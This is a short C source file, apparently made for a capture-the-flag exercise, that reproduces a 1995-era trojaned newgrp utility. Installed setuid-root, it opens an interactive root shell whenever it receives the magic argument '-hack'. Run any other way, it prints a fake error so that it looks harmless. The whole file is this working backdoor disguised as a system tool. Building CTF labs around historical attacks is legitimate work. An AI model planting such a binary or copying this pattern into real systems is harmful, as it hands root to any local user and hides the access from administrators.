/*
 * newgrp - REPRODUCTION of the period setuid-root "newgrp -hack root" trojan
 *          observed in the Feb 1995 Mitnick sessions (cf. ~/takedown TIMELINE
 *          sessions 4001 and 4007: `newgrp -hack root` -> root; the trojan was
 *          also copied to /var and chmod 4755'd in 4007).
 *
 * EDUCATIONAL ARTIFACT — written from scratch for the Berkeley Underground CTF.
 * This is NOT a recovered original binary. It is a minimal, readable
 * reproduction of the BEHAVIOUR: a setuid-root program that, when given the
 * magic argument `-hack`, drops the player into a root shell. Without the magic
 * argument it pretends to be an ordinary (stub) newgrp so casual inspection
 * looks innocuous — exactly the deception the real trojan relied on.
 *
 * Why this genuinely escalates: the build installs this binary owned by root
 * with the setuid bit set (mode 4755). When any user executes it, the kernel
 * runs it with euid 0; the program then setuid(0) to make that real, and execs
 * a shell. That is an UNMODIFIED, REAL setuid privilege escalation — the
 * vulnerability is the trust placed in a setuid-root binary, not a simulation.
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int
main(int argc, char **argv)
{
	int i;

	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-hack") == 0) {
			/* Make the inherited euid=0 real, then hand over a shell. */
			setgid(0);
			setuid(0);
			(void)fprintf(stderr,
			    "newgrp: entering group root\n");
			execl("/bin/sh", "sh", "-i", (char *)NULL);
			perror("newgrp: /bin/sh");
			return 1;
		}
	}

	/* Innocuous stub behaviour for anyone who runs it "normally". */
	(void)fprintf(stderr, "newgrp: no such group\n");
	return 1;
}
